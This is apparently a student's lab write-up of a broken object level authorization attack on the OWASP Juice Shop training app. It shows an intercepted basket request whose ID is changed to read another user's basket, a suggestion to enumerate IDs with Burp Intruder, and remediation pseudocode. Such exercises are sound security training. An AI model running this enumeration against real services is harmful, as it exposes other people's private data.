# Lab Writeup 1: Unauthorized Access to Shopping Baskets

**Category:** Broken Object Level Authorization (BOLA)
**Difficulty:** Practitioner
**Date Completed:** 29/03/2026
**Platform:** OWASP Juice Shop
**Lab URL:** http://localhost:3000

---

## 1. Objective

Exploit a broken authorization mechanism in the shopping basket endpoint to access and view the private shopping basket contents of another user, demonstrating how improper access controls can lead to sensitive data exposure.

---

## 2. Vulnerability Overview

**Vulnerability Name:** Broken Object Level Authorization (BOLA)

**CWE Reference:** CWE-639: Authorization Bypass Through User-Controlled Key

**OWASP Category:** API1:2023 – Broken Object Level Authorization

**What is this vulnerability?**

BOLA occurs when an API endpoint doesn't properly verify if the authenticated user has permission to access a specific resource. In this case, the `/rest/basket/<id>` endpoint accepts a valid JWT token but fails to verify if that token's owner is the actual owner of the basket ID being requested. This means if I manipulate the `id` parameter in the URL, I can view other users' items just by iterating through sequential numbers.

---

## 3. Reconnaissance & Discovery

When I first started exploring the Juice Shop application, I took a methodical approach to understand its cart mechanisms:

**Initial Exploration:**
- Registered two accounts: an "Attacker" (`attacker@juice-sh.op`) and a "Victim" (`victim@juice-sh.op`).
- Added an item to the basket using the Attacker account.
- Monitored traffic in Burp Suite to observe how the application fetches basket details during checkout.

**Endpoint Discovery:**
- Found the basket retrieval endpoint: `GET /rest/basket/2`
- Observed that it uses Bearer token authentication in the Authorization header.
- Noticed that the basket ID (`2`) is exposed directly in the URL path.

**The "Aha!" Moment:**
While testing as the attacker, I noticed the URL structure `GET /rest/basket/<id>`. I wondered: *What if I just change the ID from 2 to 1?* Since the application seemed to trust the token without correlating it to the requested resource ID, this presented a classic BOLA attack surface. 

**Tool(s) Used:** Burp Suite Community Edition, Firefox Browser

---

## 4. Exploitation Steps

### Step 1: Intercept the Baseline Request

I logged into my attacker account and accessed my shopping basket. My assigned basket ID was `2`. I captured this traffic using Burp Suite's Proxy.

### Step 2: Modify the Target Resource ID

I sent the request to Burp Repeater. I modified the basket ID in the URL path from `2` (my basket) to `1` (the victim's basket) while keeping my attacker authentication token.

**Modified Request (Attacker's Token, Victim's Resource ID):**
```http
GET /rest/basket/1 HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: application/json, text/plain, */*
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tl...
Accept-Language: en-US,en;q=0.9
Connection: close
```

### Step 3: Forward the Request and Observe Response

I forwarded the modified request and observed the response from the server:

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 425
Connection: close

{
  "status": "success",
  "data": {
    "id": 1,
    "UserId": 1,
    "Products": [
      {
        "id": 1,
        "name": "Apple Juice (1000ml)",
        "description": "The all-time classic.",
        "price": 1.99,
        "BasketItem": {
          "id": 1,
          "BasketId": 1,
          "ProductId": 1,
          "quantity": 2
        }
      }
    ]
  }
}
```

**Success!** The server returned a `200 OK` exposing JSON data detailing the items inside Basket #1, belonging to another user.

---

## 5. Root Cause Analysis

The vulnerability exists because the application performs user authentication but fails to enforce resource-level authorization.

**What the API Does:**
1. ✅ Validates that the JWT token is legitimate and the session is active.
2. ✅ Confirms the user is authenticated.
3. ❌ **FAILS** to check if the authenticated user's ID matches the `userId` linked to the requested `BasketId` in the database.

**What the API Should Do:**
The API controller must inherently validate the request against database ownership records:
```javascript
// Pseudocode - What's Missing
const basketIdToFetch = req.params.id;
const authenticatedUserId = req.user.id; 

const basket = await Basket.findOne({ where: { id: basketIdToFetch } });

if (basket.UserId !== authenticatedUserId) {
    return res.status(403).json("Unauthorized: You do not own this basket");
}
```

---

## 6. Impact

- [x] Privilege Escalation (horizontal)
- [x] Data Exfiltration (indirect)
- [x] Privacy Violation

**Severity:** High

**Justification:** By automating the attack using Burp Intruder to iterate from basket ID 1 to 1000, an attacker can extract the purchase intent, behavioral data, and potentially sensitive product orders of every registered user. This is a severe breach of confidentiality.

---

## 7. Remediation

Here is how developers should fix this vulnerability:

1. **Implement Resource Ownership Verification:** Ensure that endpoints referencing an ID strictly verify that the logged-in user is the legitimate owner of that database record.
2. **Implicit Linking:** Do not accept the `basketId` from the client URL. Instead, infer the basket ID automatically on the backend using the user's validated JWT token.
3. **Use GUIDs/UUIDs:** Instead of predictable, sequential integers (e.g., `1`, `2`), use cryptographically secure random UUIDs for resource identifiers to mitigate ID enumeration attacks.

---

## 8. Key Takeaways / What I Learned

- **Authentication ≠ Authorization:** Validating a session is only half the battle. We must always validate if that session has rights to the *specific data* requested.
- **Predictable IDs are Dangerous:** Auto-incrementing numbers make enumeration trivial for attackers. Use unguessable UUIDs whenever possible.
- **Server Confidence:** Never rely on the client to honestly state what it should access or own.
